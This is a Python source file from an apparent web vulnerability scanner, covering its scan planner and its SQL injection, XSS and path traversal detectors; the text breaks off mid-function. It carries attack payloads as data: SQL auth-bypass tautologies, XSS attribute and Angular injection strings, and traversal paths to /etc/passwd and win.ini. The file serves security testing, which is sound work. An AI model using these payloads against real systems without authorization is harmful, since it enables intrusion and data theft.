"""Phase 7: Scan Planner + Phase 8: Detection Framework.
Deterministic, rule-based planner: parameter kind -> candidate vulnerability classes.
Every Detector implements the contract: prepare/mutate/execute/analyze/verify.
"""
from __future__ import annotations
import re, urllib.parse
from html.parser import HTMLParser
from .core import (Endpoint, EventBus, Finding, FindingStatus, ParamKind, Severity,
                   Evidence, Verification, Parameter, ParamLocation, DiscoverySource)
from .http_engine import USER_AGENT, RequestEngine, RequestMutation


def in_script_or_style(body: str, idx: int) -> bool:
    """DETECT-15 (v4.2.3, live-caught on ginandjuice.shop /catalog?searchTerm):
    is position `idx` of the body inside a <script>...</script> or <style>...</style>
    block? AngularJS does NOT interpolate {{ }} inside script/style element content
    (the $compile service binds rendered text/attribute nodes only), so a canary
    reflected raw inside a script string is NOT an executable Angular context.
    IV14 raw evidence (2026-10-03 20:43 UTC): {{91*7}} marker lands raw in
    `var searchText = '...'` while every breakout probe (', \", </script>, \\') is
    neutralized by the app's escaper — the ng claim was a FALSE POSITIVE. Detectors
    and verifiers must not claim Angular evaluation for script-context reflections."""
    if idx < 0 or idx >= len(body):
        return False
    for m in re.finditer(r"<script\b.*?</script\s*>|<style\b.*?</style\s*>", body, re.S | re.I):
        if m.start() <= idx < m.end():
            return True
    # unclosed-block fallback: more opens than closes before idx = still inside
    opens = len(re.findall(r"<script\b", body[:idx], re.I)) + len(re.findall(r"<style\b", body[:idx], re.I))
    closes = len(re.findall(r"</script\s*>", body[:idx], re.I)) + len(re.findall(r"</style\s*>", body[:idx], re.I))
    return opens > closes


def is_self_callback(hit: dict | None, resp, oast_url: str) -> bool:
    """ENG-08 (live-caught by the v2.5.0 SSRF detector on fixture /vuln/redirect.php):
    the request engine follows SAME-HOST redirects (required for auth landings and
    crawl depth) — an open-redirect target bounces our OAST probe URL back at the
    listener and the ENGINE ITSELF performs the fetch. That callback is scanner-
    initiated, never target-side evidence. Two independent markers: (a) the hop is
    recorded in THIS response's redirect_chain, (b) the fetcher's User-Agent is the
    engine's own. Either marker disqualifies the hit — OOB evidence must come from
    the TARGET's process, not ours."""
    if resp is not None:
        for h in (getattr(resp, "redirect_chain", None) or []):
            loc = h[1] if isinstance(h, (tuple, list)) and len(h) > 1 else str(h)
            if loc == oast_url:
                return True
    h0 = hit[0] if isinstance(hit, list) and hit else (hit if isinstance(hit, dict) else None)
    ua = (h0 or {}).get("ua", "")
    return bool(ua) and ua == USER_AGENT

# ------------------------------------------------------------ Planner rules
# OWSP-09/OWSP-10 (OWASP campaign, live-caught on the OWASP Benchmark — the
# first ground-truth target): command_injection had NO planner rule, so the
# registered, OAST-armed CommandInjectionDetector was unreachable dead code on
# param surfaces (251/251 Benchmark cmdi cases: ZERO candidates; with hindsight
# every prior live campaign's "no cmdi" meant "never probed"). path_traversal
# was planned ONLY for FILENAME-kind params — but params named queryParam (the
# Benchmark's traversal vector) classify SEARCH, and generic string params are
# the common traversal surface in real apps (268/268 pathtraver cases missed).
# command_injection joins GENERIC/SEARCH (the detector is OAST-gated: inert and
# request-free whenever no OAST channel is armed); path_traversal joins
# GENERIC/SEARCH alongside the existing FILENAME rule.
PLANNER_RULES = [
    (ParamKind.NUMERIC,   ["sql_injection"]),
    (ParamKind.IDENTIFIER,["sql_injection", "idor", "header_injection"]),
    (ParamKind.SEARCH,    ["sql_injection", "xss_reflected", "header_injection",
                           "path_traversal", "command_injection"]),
    (ParamKind.URL,       ["open_redirect", "ssrf"]),
    (ParamKind.FILENAME,  ["path_traversal", "command_injection"]),
    (ParamKind.HTML,      ["xss_reflected", "header_injection"]),
    (ParamKind.GENERIC,   ["sql_injection", "xss_reflected", "header_injection",
                           "path_traversal", "command_injection"]),
]

def plan_for(ep: Endpoint) -> list[dict]:
    """Deterministic scan plan: (param, vuln_class) pairs."""
    plan = []
    for p in ep.parameters:
        # OWSP-03: submit-button pairs are flow control — the route's params
        # filter demands the exact literal; probing them only produces uniform
        # 405s (live-caught on WrongSecrets: ~1200 wasted requests, half the
        # battery). They ride along verbatim as siblings instead.
        if p.flow_control:
            continue
        # OWSP-18: file inputs are the multipart surface — text payloads are
        # ghost requests (the app reads $_FILES, never the string field)
        if getattr(p, "is_file", False):
            continue
        for kind, classes in PLANNER_RULES:
            if p.kind.value == kind.value:
                for c in classes:
                    plan.append({"endpoint": ep, "param": p, "vuln": c})
                break
    return plan


# ------------------------------------------------------------ Detector contract
class Detector:
    name = "base"
    vuln_type = ""
    severity = Severity.MEDIUM
    timeout_hint: float | None = None

    def __init__(self, engine: RequestEngine, bus: EventBus, strategy_store=None):
        self.engine, self.bus, self.strategies = engine, bus, strategy_store

    def candidates(self, ep: Endpoint) -> list[RequestMutation]:
        raise NotImplementedError

    def analyze(self, m: RequestMutation, resp) -> Finding | None:
        raise NotImplementedError


SQL_ERR_PATTERNS = [
    re.compile(r"Microsoft OLE DB Provider", re.I),
    re.compile(r"\[Microsoft\]\[ODBC", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"sqlite3?\.(OperationalError|ProgrammingError)", re.I),
    re.compile(r"Warning: mysql_", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    # MAX-03 (maximum internal test, live-caught on Juice Shop 20.2.0): the
    # raw SQLite C-library surface ("SQLITE_ERROR: near ...") — what Node/
    # Sequelize and many drivers put in the 500 body — was NOT in the list.
    # The v4.2.3 VF-04 tightening (DB-error STRING required, bare 5xx no
    # longer counts) was correct, but this signature gap made the verifier
    # reject a genuinely injectable endpoint (status_oracle candidate on
    # /rest/products/search?q=, quote+data -> 500 with SQLITE_ERROR text).
    re.compile(r"SQLITE_(ERROR|CONSTRAINT|MISUSE|RANGE)", re.I),
    re.compile(r"SQLite3?::(SQLException|Exception)", re.I),   # Ruby / PHP bindings
    re.compile(r"ORA-\d{4,5}", re.I),                          # Oracle raw
    re.compile(r"System\.Data\.SqlClient\.SqlException|SqlException\b", re.I),  # .NET
    re.compile(r"PSQLException|ERROR:\s+syntax error at or near", re.I),        # JDBC pg / pg text
]


class SQLiDetector(Detector):
    """Error-based + boolean-blind oracle. Strategies ordered by verified stats (Phase 19)."""
    name, vuln_type = "sqli", "sql_injection"
    severity = Severity.CRITICAL

    STRATEGIES = {
        "quote_error":   ["'", "''"],                      # syntax break -> 500/error string
        "boolean_and":   ["AND 1=1", "AND 1=2"],           # oracle pair
        "error_or":      ["' OR '1'='1"],
    }

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            # Phase 50 + OWSP-03 + OWSP-18: tokens/flow-controls ride verbatim;
            # file fields are the upload surface — string batteries never touch them
            if p.kind == ParamKind.TOKEN or p.flow_control or getattr(p, "is_file", False):
                continue          # Phase 50: CSRF tokens ride along verbatim, never mutated
            base = p.value if p.value.isdigit() else "1"
            # DETECT-04 (live-caught on ginandjuice.shop /catalog?category=): quote ->
            # HTTP 500 with a GENERIC error page (no SQL keywords anywhere) — the old
            # error-pattern check alone missed it. base + doubled-quote are the paired
            # controls: base must be OK, and a VALID SQL string ('') must be OK too.
            out.append(("base",        RequestMutation(endpoint=ep, param_name=p.name, param_value=base)))
            out.append(("pair_quote",  RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "''")))
            out.append(("quote_error", RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "'")))
            out.append(("boolean_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=1")))
            out.append(("boolean_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=2")))
            # DETECT-01 (live-proven on demo.testfire.net/doLogin): string-context OR-tautology
            # pair with trailing comment — fires on login/auth endpoints where the numeric
            # AND-pair cannot (values quoted as strings in SQL).
            out.append(("or_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='1' -- ")))
            out.append(("or_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='2' -- ")))
            # DETECT-06 (v4.2.2, live-caught on demo.testfire.net/doLogin 2026-10-03):
            # numeric-tautology OR pair with comment. Target drift neutralized the
            # string-comparison shape ('1'='1') on doLogin while the numeric shape
            # (OR 1=1) still bypassed to /bank/main.jsp — the battery carried ONE
            # SQL shape only, and the engine honestly reported nothing. Same oracle
            # structure (TRUE/FALSE pair, redirect or body-size differential), a
            # second, shape-independent family. Proven live: uid=1' OR 1=1-- ->
            # 302 /bank/main.jsp while uid=1' OR 1=2-- -> 302 login.jsp.
            # OWSP-14 (OWASP campaign, live-caught on DVWA 3.x / MariaDB 11.4):
            # MySQL/MariaDB require WHITESPACE after '--' to open a comment
            # (T-SQL/PostgreSQL accept it bare). The no-space shape made both
            # sides of the pair die as MariaDB syntax errors (identical 634B
            # fatal pages) on the world's most common web DB — the family was
            # calibrated on testfire's MS SQL and never met MySQL. Trailing
            # space keeps T-SQL/pgsql semantics identical.
            out.append(("ornum_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR 1=1-- ")))
            out.append(("ornum_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR 1=2-- ")))
            # MAX-09 (maximum internal test, live-caught on Juice Shop 20.2.0
            # /rest/products/search?q=): LIKE-inside-parentheses contexts —
            # WHERE ((name LIKE '%q%' OR description LIKE '%q%')) — break out
            # ONLY with paren-closing shapes: q=1')) OR 1=1-- separates TRUE/FALSE
            # while every flat shape dies as unbalanced parens (HTTP 500) or stays
            # a literal LIKE term (no differential). Apps without paren nesting
            # 500 both variants symmetrically — no differential, no false positive.
            out.append(("par2_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}')) OR 1=1-- ")))
            out.append(("par2_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}')) OR 1=2-- ")))
            out.append(("par1_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}') OR 1=1-- ")))
            out.append(("par1_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}') OR 1=2-- ")))
            # OWSP-16 (OWASP campaign, live-caught on DVWA /vulnerabilities/sqli_blind/):
            # LOOKUP-style endpoints answer the base-prefixed OR pair identically on
            # both sides (user_id='1' exists under OR 1=1 AND OR 1=2) — the tautology
            # never flips the result. The NO-BASE pair (empty left side) turns the
            # WHERE into a pure tautology: TRUE -> any row exists (200), FALSE -> no
            # rows (apps answer 404 'MISSING' / empty) — a status-flip oracle the
            # base-prefixed families structurally cannot produce. Guards: base must
            # be OK (broken base endpoint = no oracle); a non-SQLi app treats both
            # as literal values -> no flip -> honest silence.
            out.append(("nb_or_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value="' OR '1'='1' -- ")))
            out.append(("nb_or_false", RequestMutation(endpoint=ep, param_name=p.name, param_value="' OR '1'='2' -- ")))
        return out

    def analyze(self, pair, resp_map) -> Finding | None:
        """pair = (endpoint, param). resp_map: strategy->Response."""
        ep, p = pair
        ev = []
        # 1) error-based
        # OWSP-12 (OWASP campaign, live-caught via the Benchmark's ground truth):
        # the error-string match alone fired on surfaces where the server answers
        # 500-with-SQL-error-text REGARDLESS of the payload (missing required
        # input, broken CALL shape) — 26 of 492 verified findings were this
        # degenerate signal (all db_error-only evidence; measured against
        # expectedresults-1.2.csv). The PAIRED CONTROL: the base value must NOT
        # produce the same SQL-error signature — a quote-SPECIFIC error is a
        # real signal; an always-erroring surface is not.
        r = resp_map.get("quote_error")
        rbase = resp_map.get("base")
        # OWSP-13 (OWASP campaign, live-caught on DVWA 3.x / PHP 8.5): the old gate
        # required `not r.ok` — the SQL error had to surface as HTTP 4xx/5xx. PHP
        # applications with display_errors=On print the fatal error INSIDE A 200
        # RESPONSE (DVWA /sqli/?id=1' -> 200 + 'Fatal error: Uncaught
        # mysqli_sql_exception: You have an error in your SQL syntax ... MariaDB
        # server version'), so the world's most common web stack never reached the
        # signature check. The signature must be evaluated REGARDLESS of status;
        # the OWSP-12 degenerate-surface control stays (base must not carry it) and
        # gains the pair_quote control (a VALID SQL string '1''' must not carry it
        # either — an always-erroring surface fails on both).
        if r is not None and r.status:
            def _sig(body: str):
                for p in SQL_ERR_PATTERNS:
                    m2 = p.search(body)
                    if m2:
                        return m2
                return None
            base_pat = _sig(rbase.body or "") if (rbase is not None and rbase.status) else None
            rq2 = resp_map.get("pair_quote")
            pair_pat = _sig(rq2.body or "") if (rq2 is not None and rq2.status) else None
            mm = _sig(r.body or "")
            if mm and not base_pat and not pair_pat:
                ev.append(Evidence("db_error", f"{mm.re.pattern[:40]} matched: {mm.group(0)[:80]}", r.request_id))
        # 1b) DETECT-04 — status oracle: quote breaks the server (5xx) while the base
        # value AND a syntactically-valid doubled quote both succeed. A 5xx-on-quote
        # alone is weak (apps crash on odd input); the paired controls make it a
        # SQL-shaped signal. 4xx is deliberately EXCLUDED — ginandjuice ?productId=1'
        # returns 400 "Invalid product ID" from input VALIDATION, not SQL (live-proven
        # false lead: flagging it would have been a false positive).
        rq, rb, rp = resp_map.get("quote_error"), resp_map.get("base"), resp_map.get("pair_quote")
        if (rq is not None and rb is not None and rp is not None and
                rq.status >= 500 and rb.ok and rp.ok):
            ev.append(Evidence("status_oracle",
                f"quote -> HTTP {rq.status} (generic error, no DB string) while base -> {rb.status} "
                f"and doubled-quote -> {rp.status} — SQL syntax break", rq.request_id))
        # 2) boolean oracle (status differential, 200 vs 500) — the proven real-world oracle
        rt, rf = resp_map.get("boolean_true"), resp_map.get("boolean_false")
        oracle = False
        if rt is not None and rf is not None and rt.status and rf.status:
            if rt.ok and not rf.ok:
                oracle = True
                ev.append(Evidence("response_diff",
                    f"TRUE probe -> HTTP {rt.status} ({len(rt.body)}B), FALSE probe -> HTTP {rf.status} ({len(rf.body)}B) — boolean oracle", rt.request_id))
            elif abs(len(rt.body or "") - len(rf.body or "")) > max(200, 0.25 * max(len(rt.body or "x"), 1)):
                oracle = True
                ev.append(Evidence("response_diff",
                    f"body-size differential {len(rt.body)}B vs {len(rf.body)}B on condition flip", rt.request_id))
        # 3) DETECT-01 — OR-tautology redirect differential (auth-bypass oracle, string context)
        # ENG-01: hop_location() reads the FIRST-HOP target even when the engine
        # auto-follows the redirect (old code saw only the final 200 — oracle destroyed).
        ot, of = resp_map.get("or_true"), resp_map.get("or_false")
        if ot is not None and of is not None and ot.status and of.status:
            lt, lf = ot.hop_location(), of.hop_location()
            if lt and lf and lt != lf:
                oracle = True
                ev.append(Evidence("redirect_diff",
                    f"OR-tautology redirect differential: TRUE -> {lt}, FALSE -> {lf} — auth-bypass oracle",
                    ot.request_id))
            # 3b) DETECT-05 (live-caught on ginandjuice.shop /catalog?category=): the
            # string-context OR pair must ALSO check the body-size differential — the
            # redirect oracle only exists on auth flows; on data endpoints the tautology
            # changes the RESULT SET SIZE instead (TRUE -> all products 17KB, FALSE ->
            # empty category 9.4KB). The AND-pair already had this check; the OR pair
            # (the only one that works in string contexts) did not.
            elif ot.ok and of.ok and ot.status == of.status:
                bt, bf = len(ot.body or ""), len(of.body or "")
                if abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1)):
                    oracle = True
                    ev.append(Evidence("response_diff",
                        f"OR-pair body-size differential on condition flip: TRUE {bt}B vs FALSE {bf}B "
                        f"(string-context boolean oracle)", ot.request_id))
        # 4) DETECT-06 — numeric-tautology OR pair (auth-bypass oracle, numeric shape).
        #    Same structure as (3): redirect differential first (login flows), then the
        #    body-size differential (data endpoints). Mirrors the guards of (3b):
        #    both responses OK, SAME status, diff > max(200, 25%).
        nt, nf = resp_map.get("ornum_true"), resp_map.get("ornum_false")
        if nt is not None and nf is not None and nt.status and nf.status:
            lnt, lnf = nt.hop_location(), nf.hop_location()
            if lnt and lnf and lnt != lnf:
                oracle = True
                ev.append(Evidence("redirect_diff",
                    f"numeric-OR redirect differential: TRUE -> {lnt}, FALSE -> {lnf} — auth-bypass oracle",
                    nt.request_id))
            elif nt.ok and nf.ok and nt.status == nf.status:
                bnt, bnf = len(nt.body or ""), len(nf.body or "")
                if abs(bnt - bnf) > max(200, 0.25 * max(bnt, bnf, 1)):
                    oracle = True
                    ev.append(Evidence("response_diff",
                        f"numeric-OR body-size differential on condition flip: TRUE {bnt}B vs FALSE {bnf}B "
                        f"(numeric-shape boolean oracle)", nt.request_id))
        # 5) MAX-09 — paren-closing OR pairs (LIKE-inside-parens contexts).
        #    Same two-oracle structure as (3)/(4): redirect differential first
        #    (login flows), then the body-size differential (data endpoints).
        #    Symmetric failure (500/500 or equal bodies) stays silent — the
        #    anti-FP guard of the flat pairs applies unchanged.
        # 6) OWSP-16 — no-base OR pair: existence-flip oracle on lookup pages
        #    (200 'exists' vs 404 'MISSING'/empty). The base-prefixed families
        #    cannot flip when the base value itself matches a row; the no-base
        #    tautology decides existence alone. Guards: base OK, TRUE probe OK,
        #    FALSE probe NOT OK (status flip, not a size wobble).
        nt2, nf2, rb2 = resp_map.get("nb_or_true"), resp_map.get("nb_or_false"), resp_map.get("base")
        if nt2 is not None and nf2 is not None and nt2.status and nf2.status:
            if rb2 is not None and rb2.ok and nt2.ok and not nf2.ok:
                oracle = True
                ev.append(Evidence("status_flip",
                    f"no-base OR existence flip: base -> {rb2.status}, tautology TRUE -> {nt2.status} "
                    f"({len(nt2.body or '')}B), FALSE -> {nf2.status} ({len(nf2.body or '')}B) "
                    "— boolean-blind oracle", nt2.request_id))
        for _pt, _pf, _lbl in (("par2_true", "par2_false", "paren2"),
                               ("par1_true", "par1_false", "paren1")):
            pt, pf = resp_map.get(_pt), resp_map.get(_pf)
            if pt is not None and pf is not None and pt.status and pf.status:
                lpt, lpf = pt.hop_location(), pf.hop_location()
                if lpt and lpf and lpt != lpf:
                    oracle = True
                    ev.append(Evidence("redirect_diff",
                        f"{_lbl} OR redirect differential: TRUE -> {lpt}, FALSE -> {lpf} — "
                        "paren-closing auth-bypass oracle", pt.request_id))
                elif pt.ok and pf.ok and pt.status == pf.status:
                    bpt, bpf = len(pt.body or ""), len(pf.body or "")
                    if abs(bpt - bpf) > max(200, 0.25 * max(bpt, bpf, 1)):
                        oracle = True
                        ev.append(Evidence("response_diff",
                            f"{_lbl}-OR body-size differential on condition flip: TRUE {bpt}B vs "
                            f"FALSE {bpf}B (paren-closing boolean oracle)", pt.request_id))
        if not ev:
            return None
        return Finding(type="sql_injection", severity=self.severity, endpoint_url=ep.url,
                       parameter=p.name, method=ep.method, evidence=ev, status=FindingStatus.CANDIDATE)


class XSSDetector(Detector):
    name, vuln_type = "xss", "xss_reflected"
    severity = Severity.HIGH
    CANARY = "sentinelxssmarker"
    # DETECT-14 (Phase 54): context-adaptive battery. ONE benign known-tag probe per
    # mutable param decides the battery — live-modeled on ginandjuice.shop /blog?search
    # (tag+handler blacklist: every known tag 400s, quote payloads pass raw) and on
    # AngularJS pages (braces survive every HTML escaper; the expression evaluates in
    # any ng-app binding on render):
    #   tag-filtered (probe 400/403)  -> attr_inject battery (no '<' at all)
    #   ng-app in the page            -> + {{expression}} vector
    #   plain                         -> classic full-tag + slash-free battery
    # The probe costs one request per param and its response never fabricates a
    # candidate (it contains no battery needle).
    ATTR_PAYLOAD = 'pro43" onfocus="sentinelAttr'
    NG_PAYLOAD = "{{91*7}}sentinelngmark"

    def _context_probe(self, ep, p) -> tuple[str, bool]:
        """Send '<b>canaryflt</b>'; classify the param's input context."""
        try:
            r = self.engine.send(RequestMutation(
                endpoint=ep, param_name=p.name,
                param_value=f"<b>{self.CANARY}flt</b>", note="xss-context-probe"))
        except Exception:
            r = None
        if r is None or r.error:
            return "unknown", False
        filtered = r.status in (400, 403)
        angular = "ng-app" in (r.body or "").lower()
        return ("filtered" if filtered else "plain"), angular

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            if p.kind == ParamKind.TOKEN or p.flow_control or getattr(p, "is_file", False):
                continue          # Phase 50: mutating a CSRF token only breaks the flow; OWSP-18: file fields are upload-only
            mode, angular = self._context_probe(ep, p)
            # VR-03 (live-caught on ginandjuice.shop /catalog?category=): the full-tag
            # canary carries a closing tag </sentinelxssmarker> — apps that escape only
            # the '/' (e.g. </ -> <\/ as JS-string hardening) break the needle match
            # even though < and > pass RAW (real reflection: const x = "Gin<svg onload=..>").
            # Slash-free variant detects the unescaped-markup weakness independently.
            if mode != "filtered":
                out.append(("full_tag", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}>pro41</{self.CANARY}>")))
                out.append(("slash_free", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=f"<{self.CANARY}pro42")))
            else:
                # tag-filtered context: attribute injection needs no '<' — the handler
                # rides into a tag the SERVER itself emitted (live-executed on
                # ginandjuice /blog?search: " onload="... into the tracker img).
                out.append(("attr_inject", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=self.CANARY + self.ATTR_PAYLOAD)))
            if angular:
                out.append(("ng_expr", RequestMutation(endpoint=ep, param_name=p.name,
                        param_value=self.NG_PAYLOAD)))
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        # DETECT-10 (live-proven on ginandjuice.shop /catalog/subscribe): the email
        # param reflects RAW inside an application/json response — but a JSON body is
        # parsed as data by the browser, never as markup. Flagging it would be a
        # FALSE POSITIVE; the real verdict belongs to the browser submit-flow (does
        # the client render the response value into an HTML sink?). Only HTML-ish
        # (or unspecified) response types are candidate XSS reflections here.
        ct = (resp.headers or {}).get("content-type", "")
        if "json" in ct.lower() and "html" not in ct.lower():
            return None
        checks = [
            (f"<{self.CANARY}>pro41</{self.CANARY}>", "unescaped_reflection"),
            (f"<{self.CANARY}pro42", "unescaped_reflection"),
            (self.CANARY + self.ATTR_PAYLOAD, "attribute_injection_reflection"),
            (self.NG_PAYLOAD, "ng_expression_reflection"),
        ]
        for needle, kind in checks:
            if needle in resp.body:
                i = resp.body.find(needle)
                # DETECT-15 (v4.2.3): an {{expression}} canary that lands inside
                # script/style content is NOT in an Angular binding context — skip it
                # (the reflection itself may be real, but claiming client-side
                # evaluation there is a false verdict; IV14 adjudicated the
                # ginandjuice searchTerm claim as exactly this false positive).
                if kind == "ng_expression_reflection" and in_script_or_style(resp.body, i):
                    continue
                ctx = resp.body[max(0, i - 60):i + len(needle) + 30].replace("\n", " ")
                detail = {"attribute_injection_reflection":
                              "quote+event-handler reflected raw — injectable attribute context, no '<' needed (tag-filter resistant)",
                          "ng_expression_reflection":
                              "Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics"}.get(kind, f"canary reflected raw in context: …{ctx}…")
                return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
                           [Evidence(kind, detail + f" [ctx: …{ctx}…]", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        return None


class TraversalDetector(Detector):
    name, vuln_type = "traversal", "path_traversal"
    severity = Severity.HIGH
    MARKERS = [("[fonts]", "win.ini"), ("[boot loader]", "boot.ini"), ("root:x:0:0:", "/etc/passwd"),
               ("SENTINEL-SECRET-FILE", "fixture secret file")]

    def candidates(self, ep: Endpoint):
        payloads = []
        for depth in (4, 6, 8):
            payloads.append("../" * depth + "windows/win.ini")
            payloads.append("../" * depth + "etc/passwd")
        payloads.append("....//....//....//windows/win.ini")
        return [(pl, RequestMutation(endpoint=ep, param_name=p.name, param_value=pl))
                for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control
                for pl in payloads[:4]]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        for marker, fname in self.MARKERS:
            if marker in resp.body:
                i = resp.body.find(marker)
                return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                               [Evidence("file_marker", f"content of {fname} leaked (marker {marker!r} at offset {i})",
                                         resp.request_id, resp.body[i:i + 200])],
                               status=FindingStatus.CANDIDATE)
        return None


# ------------------------------------------------------------ DETECT-16 (v4.2.3): stored XSS
class _StoredFormParser(HTMLParser):
    """DETECT-16 helper: parse the forms of ONE page WITH field types — the crawl
    parser records (name, value) only, but the stored flow must distinguish hidden
    ride-along fields (ASP.NET __VIEWSTATE, rotating CSRF tokens — round-tripped
    with FRESH values; the live miss on testaspnet Comments.aspx was exactly a
    stale-viewstate 500, IV13 evidence aspnet2.json) from the mutable injection
    surface (text inputs + textareas). SUBMIT BUTTONS ARE CAPTURED TOO and ride
    along on submit — ASP.NET WebForms routes the postback event through the
    clicked button's name=value pair (btnSend=Send); dropping it makes the
    server accept the POST and silently discard the comment (live-caught on
    testaspnet /Comments.aspx: POST 200, nothing stored — the IV13 success sent
    the button; the engine's first flow did not)."""
    RIDING = {"hidden", "submit", "button", "reset", "image"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []          # [{action, method, fields: [[name, value, type]]}]
        self._cur = None
        self._sel = None         # name of an open <select> awaiting its default
        self._btn = None         # open <button> awaiting its text content

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method") or "GET").upper(), "fields": []}
        elif self._cur is not None and tag == "input" and a.get("name"):
            t = (a.get("type") or "text").lower()
            if t in ("submit", "button", "reset", "image"):
                # named buttons ride along on submit (WebForms event routing);
                # unnamed ones submit nothing and are dropped
                self._cur["fields"].append([a["name"], a.get("value", ""), "submitbutton"])
            else:
                self._cur["fields"].append([a["name"], a.get("value", ""), t])
        elif self._cur is not None and tag == "textarea" and a.get("name"):
            self._cur["fields"].append([a["name"], "", "textarea"])
        elif self._cur is not None and tag == "button" and a.get("name"):
            self._btn = [a["name"], a.get("value", ""), "submitbutton"]
            self._cur["fields"].append(self._btn)
        elif self._cur is not None and tag == "select" and a.get("name"):
            self._sel = a["name"]
            self._cur["fields"].append([a["name"], "", "select"])
        elif self._sel is not None and tag == "option":
            for f in self._cur["fields"]:
                if f[0] == self._sel and f[2] == "select" and f[1] == "":
                    f[1] = a.get("value", "") or ""   # first option = browser default

    def handle_data(self, data):
        # <button>text</button>: browsers submit the TEXT when the value attr is absent
        if self._btn is not None and not self._btn[1]:
            self._btn[1] = (self._btn[1] or "") + data.strip()

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None
        elif tag == "select":
            self._sel = None
        elif tag == "button":
            self._btn = None


def _get_endpoint_for(url: str, method: str = "GET", params: list | None = None) -> Endpoint:
    """Build an Endpoint that PRESERVES the URL's query string — the request engine
    serializes the query from ep.parameters and silently drops a query embedded in
    the raw URL (base + rebuilt-query in _render; same lesson as discovery DISC-06
    for form actions). Every stored-flow GET/POST (origin fetch, submit, render
    surfaces) and the path-traversal probes go through here."""
    s = urllib.parse.urlsplit(url)
    base = urllib.parse.urlunsplit((s.scheme, s.netloc, s.path, "", ""))
    qfields = urllib.parse.parse_qsl(s.query, keep_blank_values=True)
    plist = [Parameter(n, ParamLocation.QUERY, v) for n, v in qfields]
    for p in (params or []):
        plist.append(p)
    return Endpoint(url=base, method=method, parameters=plist)


def fresh_form(engine, origin_url: str, ep: Endpoint):
    """DETECT-16 helper: fetch the form's origin page FRESH and return the parsed
    form matching the endpoint's action path + method. Returns (origin_resp, form)
    with form=None when no match. Used standalone by the detector to pre-filter
    render-capable target fields (passwords are hashed server-side, hidden fields
    are ride-along state — neither is ever a stored-render surface), and inside
    stored_xss_flow where each submit gets its own fresh round-trip (rotating
    __VIEWSTATE / one-shot CSRF tokens stay valid)."""
    origin_resp = engine.send(RequestMutation(endpoint=_get_endpoint_for(origin_url),
                                              note="stored-xss-fresh-form"))
    if origin_resp is None or origin_resp.error or not origin_resp.body:
        return origin_resp, None
    fp = _StoredFormParser()
    try:
        fp.feed(origin_resp.body)
    except Exception:
        return origin_resp, None
    want_path = urllib.parse.urlsplit(ep.url).path
    want_method = (ep.method or "GET").upper()
    for f in fp.forms:
        action_abs = urllib.parse.urljoin(origin_url, f["action"] or origin_url)
        if (urllib.parse.urlsplit(action_abs).path == want_path
                and (f["method"] or "GET").upper() == want_method):
            f["_action_abs"] = action_abs
            return origin_resp, f
    return origin_resp, None


def stored_xss_flow(engine, ep: Endpoint, param: str, canary: str,
                    origin_url: str, surfaces: list | None = None):
    """DETECT-16 (v4.2.3) shared flow — detector AND verifier call this (verification
    = full re-execution with a FRESH canary, never a replay of the detection request).
      1. re-fetch the form's origin page FRESH and parse its fields (rotating
         __VIEWSTATE / CSRF tokens must round-trip with fresh values);
      2. submit the form with the canary in the target mutable field — hidden fields
         ride verbatim, sibling fields keep the page's own defaults (honest form
         replay: a browser submits exactly what the page carries);
      3. fetch the render surfaces — the form action URL (its own page: where a
         posted comment renders), the form's origin page, and the action's parent
         directory (the app-home pattern: gruyere renders the signup uid in the
         menu of every page under /<instance>/). The SUBMIT response itself is
         deliberately NOT a surface: a canary echoed there is a REFLECTION and
         belongs to the reflected detector, not to the stored class;
      4. persistence control: a raw hit must survive an INDEPENDENT second fetch —
         a transient echo is reflection, only a surviving marker is storage.
    Returns (origin_resp, submit_resp, hits) with hits = [(url, resp1, resp2), ...]."""
    # 1) fresh form page
    origin_resp, form = fresh_form(engine, origin_url, ep)
    if form is None:
        return origin_resp, None, []
    # the target field must be a RENDER-capable input: passwords are hashed
    # server-side (never rendered back), hidden fields are ride-along state
    # (mutating them only breaks the flow — the __VIEWSTATE 500 lesson).
    tgt_type = next((ft for n, _v, ft in form["fields"] if n == param), None)
    if tgt_type in ("password", "hidden"):
        return origin_resp, None, []
    # 2) build the submit with the canary in the target field — the browser's
    # POST shape: every form field rides along, hidden fields with FRESH page
    # values, the FIRST named submit button clicked (WebForms event routing),
    # sibling mutables with the page's own defaults.
    fields, target_seen, btn_done = [], False, False
    for name, value, ftype in form["fields"]:
        if name == param:
            fields.append((name, canary))
            target_seen = True
        elif ftype == "submitbutton":
            if not btn_done:
